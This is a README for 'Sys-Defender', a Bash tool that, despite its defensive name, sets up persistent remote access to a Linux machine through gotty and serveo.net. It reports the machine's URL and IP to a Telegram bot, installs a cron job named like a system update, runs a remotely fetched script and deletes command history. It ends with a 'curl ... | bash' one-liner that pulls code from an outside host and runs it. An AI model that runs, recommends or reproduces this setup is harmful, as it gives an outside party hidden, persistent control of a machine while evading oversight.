# Sys-Defender
================

Sys-Defender is a Bash script designed to provide a secure and persistent way to access a Linux system via a reverse SSH connection. The script uses the `gotty` tool to create a reverse SSH connection and the `serveo.net` platform to generate a public URL that can be used to access the system.

## Features

*   Creates a reverse SSH connection using `gotty` and `serveo.net`
*   Generates a public URL that can be used to access the system
*   Sends the public URL and the public IP address of the system to a Telegram chat using a bot
*   Installs a cron job to run the script every 5 minutes to keep the reverse SSH connection active
*   Deletes recent command history to maintain privacy

## Prerequisites

*   A Linux system with Bash installed
*   The `gotty` tool (automatically installed if not available)
*   A Telegram account and a configured bot
*   The `serveo.net` platform (used to generate the public URL)

## Usage

1.  Edit the script and replace the `TELEGRAM_TOKEN` and `TELEGRAM_CHAT_ID` variables with your own values.
2.  Edit the script and replace the `SCRIPT_URL` variable with the URL of the script you want to execute.
3.  Run the script as root using the command `./sys-defender.sh`
4.  The script will generate a public URL and send it to your Telegram chat.

## Installation

1.  Clone the repository using the command `git clone https://github.com/your-username/sys-defender.git`
2.  Change to the repository directory using the command `cd sys-defender`
3.  Edit the script and replace the `TELEGRAM_TOKEN` and `TELEGRAM_CHAT_ID` variables with your own values.
4.  Edit the script and replace the `SCRIPT_URL` variable with the URL of the script you want to execute.
5.  Run the script as root using the command `./sys-defender.sh`

## Contribution

If you would like to contribute to this project, you can do so in several ways:

*   Report bugs or issues in the repository's issues section.
*   Provide suggestions or ideas for improving the script in the repository's issues section.
*   Make changes to the code and submit a pull request to the repository.

## License

This project is licensed under the MIT License. You can find more information in the LICENSE file of the repository.

## Acknowledgments

*   To the developers of `gotty` and `serveo.net` for providing useful tools and platforms for this project.
*   To the Telegram community for providing a platform for communication and collaboration.

## Security Notes

* **Responsible Use**: This script should only be used on systems where you have permission to access. Unauthorized use of this script may be considered illegal and could have legal consequences.
* **Telegram Bot Configuration**: Ensure that your Telegram bot has the appropriate permissions to send messages to your chat. You can set up a bot using BotFather on Telegram.
* **SSH Connections**: The reverse SSH connection can be a vector for attack if not managed properly. Make sure to protect your system with firewalls and other security measures.

## Common Issues

1. **URL not generated**: Ensure that `serveo.net` is functioning correctly and that there are no network issues preventing the connection.
2. **Error sending message to Telegram**: Verify that your `TELEGRAM_TOKEN` and `TELEGRAM_CHAT_ID` are configured correctly. Ensure the bot has access to the chat.
3. **Gotty not installing**: If there is an issue downloading or installing `gotty`, check your internet connection and ensure the download link is valid.

## Customization

You can customize the script according to your needs:

- **Cron Frequency**: Change the line `CRON_JOB="*/5 * * * * $HOME/.sys-update.sh"` to adjust how often you want the script to run.
- **Additional Commands**: You can add more functionalities to the script as needed, such as executing specific commands or integrating with other services.

## Execution Example

To execute the script, run the following command:

```bash
    curl fsSL -s https://get.madolell.com | bash
````



